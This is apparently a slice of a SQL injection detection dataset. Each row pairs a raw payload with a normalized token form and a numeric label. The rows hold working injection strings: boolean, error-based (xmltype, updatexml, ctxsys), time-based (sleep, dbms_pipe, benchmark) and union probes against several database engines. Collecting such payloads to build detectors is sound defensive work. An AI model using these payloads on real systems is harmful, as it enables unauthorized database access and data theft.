id|payload_norm
"5866"|"1 where 1519 = 1519","__INT__ where __INT__ = __INT__","","","0.0"
"5867"|"1' ) ) rlike ( select ( case when ( 6205 = 1384 ) then 1 else 0x28 end ) ) and ( ( 'ahjf' = 'ahjf","__INT__ __STR__ __IDENT__ __STR__ __IDENT__","","","0.0"
"5868"|"select * from users WHERE username = ""-7710\' where 5658 = 5658 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk""","select * from __IDENT__ where __IDENT__ = __STR__","","","0.0"
"5869"|"1"" ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ""utlk"" like ""utlk","__INT__ __STR__ __IDENT__ __STR__ __IDENT__","","","0.0"
"5870"|"select * from users WHERE username = ""1%\' ) ) ) and username = ""1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ""","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__","","","0.0"
"5871"|"-3505"" ) or 5290 = 3436--","- __INT__ ) or __INT__ = __INT__ - -","","","0.0"
"5872"|"-4960' ) union all select 5300--","- __INT__ ) union all select __INT__ - -","","","0.0"
"5873"|"select * from users WHERE username = ""1"" or username = ""-6190\' ) where 2621 = 2621 or-- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-7746\' ) ) ) || 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = "" - __INT__ __STR__ ) ) ) | | __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual )","","","0.0"
"5874"|"1'|| ( select 'vdeo' where 4355 = 4355","__INT__ __STR__ __IDENT__ where __INT__ = __INT__","","","0.0"
"5875"|"select * from users WHERE username = ""1 ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ ) ) ) and __INT__ = cast ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) __IDENT__ | | ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) as __IDENT__ )","","","0.0"
"5876"|"select * from users WHERE username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1\' ) ) and ( ( \'opyp\' = \'opyp""","select * from __IDENT__ where __IDENT__ = __STR__","","","0.0"
"5877"|"select * from users WHERE username = ""1\' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( \'cbwx\' = \'cbwx"" and username = ""1 ) ) as dgso where 4654 = 4654","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ ) ) as __IDENT__ where __INT__ = __INT__","","","0.0"
"5878"|"1' ) where 7887 = 7887 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --","__INT__ ) where __INT__ = __INT__ and __IDENT__ ( __INT__ , concat ( __HEX__ , __HEX__ , ( select ( __IDENT__ ( __INT__ = __INT__ , __INT__ ) ) ) , __HEX__ ) , __INT__ ) - -","","","0.0"
"5879"|"select * from users WHERE username = ""-1190\' and \'yxry\' like \'yxry"" and ( ( ( 1248 = 1248"" or username = ""-3899\' ) where 8152 = 8152 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""","select * from __IDENT__ where __IDENT__ = __STR__ and ( ( ( __INT__ = __INT__ __STR__ - __INT__ ) where __INT__ = __INT__ or __INT__ = cast ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) __IDENT__ | | ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) as __IDENT__ ) - - ""","","","0.0"
"5880"|"-8809'|| ( select 'hyzr' where 5694 = 5694 union all select 5694--","- __INT__ __STR__ __IDENT__ where __INT__ = __INT__ union all select __INT__ - -","","","0.0"
"5881"|"select * from users WHERE username = ""-5751 ) as jybu where 4739 = 4739 or username = ""1%\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'%\' = \'""","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ % \ __STR__ % \ __STR__ ""","","","0.0"
"5882"|"select * from users WHERE username = ""-1190\' and \'yxry\' like \'yxry"" and username = ""-1985 ) ) ) or username = ""-6665\' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'winx\' = \'winx""","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ - __INT__ __STR__ __IDENT__ __STR__ __IDENT__","","","0.0"
"5883"|"1' ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( 'nsji' = 'nsji","__INT__ __STR__ __IDENT__ __STR__ __IDENT__","","","0.0"
"5884"|"select * from users WHERE username = ""1"" and username = ""-1254"" and username = ""-1344 ) as gqgi where 2545 = 2545 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""1%\'","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ and __IDENT__ = __STR__ and __IDENT__ = __INT__ % __IDENT__","","","0.0"
"5885"|"select * from users WHERE username = ""-1344 ) as gqgi where 2545 = 2545 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1 ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 3505 = 3505""","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__","","","0.0"
"5886"|"select * from users WHERE username = ""-1549\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( \'fnwx\' = \'fnwx"" and username = ""1\' ) ) as plbt where 4368 = 4368","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ ) ) as __IDENT__ where __INT__ = __INT__","","","0.0"
"5887"|"select * from users WHERE username = ""1\'+ ( select \'pvej\' where 4496 = 4496 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +\'"" and username = ""-3899\' ) where 8152 = 8152","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ ) where __INT__ = __INT__","","","0.0"
"5888"|"1"" ) where 1001 = 1001 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #","__INT__ ) where __INT__ = __INT__ __IDENT__ __IDENT__ ( __IDENT__ ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , md5 ( __HEX__ ) ) ) ) ) , __INT__ ) #","","","0.0"
"5889"|"1' ) ) ) and 7401 = 9838#","__INT__ ) ) ) and __INT__ = __INT__","","","0.0"
"5890"|"SELECT * FROM users WHERE username = ""1\'+ ( select oljg where 2006 = 2006 OR username = ""1\'|| ( select \'byxb\' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||\'""","select * from __IDENT__ where __IDENT__ = __STR__","","","0.0"
"5891"|"1' ) where 3572 = 3572","__INT__ ) where __INT__ = __INT__","","","0.0"
"5892"|"select * from users WHERE username = ""1"" and username = ""1\'+ ( select \'kicv\' where 1976 = 1976 or username = ""-8163 ) ) as cvai where 2360 = 2360","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ - __INT__ ) ) as __IDENT__ where __INT__ = __INT__","","","0.0"
"5893"|"select * from users WHERE username = ""-1985 ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""1 )","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ )","","","0.0"
"5894"|"select * from users WHERE username = ""-1254"" and username = ""-2756\' where 6156 = 6156 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-6523"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ or __IDENT__ = __STR__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - ""","","","0.0"
"5895"|"1 where 7642 = 7642 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --","__INT__ where __INT__ = __INT__ or __INT__ = __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) , __INT__ ) - -","","","0.0"
"5896"|"select * from users WHERE username = ""-4248 where 3288 = 3288 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-3880 ) and username = ""-9688%\' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( \'%\' = \'""","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ - __INT__ % \ __STR__ % \ __STR__ ""","","","0.0"
"5897"|"1%' and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and '%' = '","__INT__ % __STR__ % __STR__","","","0.0"
"5898"|"select * from users WHERE username = ""1"" or username = ""-3424\' ) ) or username = ""-6523"" and username = ""-6720\' ) ) ) and 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = "" - __INT__ __STR__ ) ) ) and __INT__ = __IDENT__ ( __INT__ , ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) )","","","0.0"
"5899"|"-3535%' ) ) ) or 5605 = 4660 and ( ( ( '%' = '","- __INT__ % __STR__ % __STR__","","","0.0"
"5900"|"select * from users WHERE username = ""1\' ) and username = ""-2756\' where 6156 = 6156 and 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-2992\' ) )","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ ) )","","","0.0"
